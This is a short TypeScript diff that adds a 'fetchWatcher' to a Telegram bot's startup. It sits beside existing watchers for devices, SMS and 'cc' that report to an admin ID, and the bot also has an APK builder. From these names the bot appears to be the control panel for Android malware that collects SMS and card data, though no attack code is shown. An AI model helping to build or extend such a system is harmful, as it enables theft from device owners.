@@ -12,6 +12,7 @@ import {
 } from "./apkBuilder";
 import { startDeviceWatcher } from "./deviceWatcher";
 import { startCcWatcher } from "./ccWatcher";
+import { startFetchWatcher } from "./fetchWatcher";
 import { startSmsWatcher } from "./smsWatcher";
 import { setLogBot, adminLog } from "./adminLog";
 import {
@@ -850,6 +851,7 @@ export async function startBot(): Promise<void> {
   startDeviceWatcher(bot!, ADMIN_ID);
   startSmsWatcher(bot!, ADMIN_ID);
   startCcWatcher(bot!, ADMIN_ID);
+  startFetchWatcher(bot!);
   logger.info("Watchers started (immediate)");
 
   // Custom long-polling loop. We intentionally do NOT use telegraf's built-in
